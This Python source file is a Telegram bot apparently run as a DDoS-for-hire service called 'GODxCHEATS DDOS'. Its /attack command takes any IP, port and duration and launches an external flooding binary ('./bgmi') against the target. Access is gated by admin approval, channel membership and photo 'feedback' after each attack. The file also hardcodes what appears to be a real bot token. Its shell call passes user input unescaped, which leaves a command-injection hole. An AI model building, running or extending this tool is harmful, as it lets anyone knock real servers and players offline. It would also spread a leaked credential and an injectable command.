import asyncio
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
import os

# Configuration
TELEGRAM_BOT_TOKEN = ("7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4")  # Fetch token from environment variable
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@gosjsisnsnsnsjan"  # Replace with your channel username
attack_in_progress = False

# Check if the token is set
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")

# Load and Save Functions for Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return {line.split(',')[0].strip(): line.split(',')[1].strip() for line in file.readlines()}
    except FileNotFoundError:
        return {}

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        for user_id, feedback_status in approved_ids.items():
            file.write(f"{user_id},{feedback_status}\n")

approved_ids = load_approved_ids()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/alluser - List all approved users and groups (admin only).\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group ID to use the bot."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()

    # Validate that the target ID is a number
    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    # Add the target ID to the approved list
    approved_ids[target_id] = 'no_feedback'
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and a channel member."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
        return

    if approved_ids[str(user_id)] == 'no_feedback':
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must provide feedback (a photo) after your first attack to continue using the bot.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack Launched ✅*\n\n"
        f"*🎯 Target:* {ip}\n"
        f"*🔌 Port:* {port}\n"
        f"*⏱ Time:* {time} seconds\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*♥️ Attack Finished ♥️*\n"
                                                              "*Laude ab to attack bhi finish ho gaya feedback bhej*", parse_mode='Markdown')

async def handle_feedback(update: Update, context: CallbackContext):
    """Handle the feedback image."""
    user_id = update.effective_user.id
    file = update.message.photo[-1].get_file()  # Get the largest photo size
    file_path = await file.download_to_drive(f"feedback_{user_id}.jpg")

    # Update the user's feedback status
    approved_ids[str(user_id)] = 'feedback_received'
    save_approved_ids()

    await update.message.reply_text("*✅ Feedback received. You can now initiate another attack.*")

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("attack", attack))
    
    # Message Handler for Feedback (photos)
    application.add_handler(MessageHandler(filters.PHOTO, handle_feedback))

    application.run_polling()

if __name__ == '__main__':
    main()
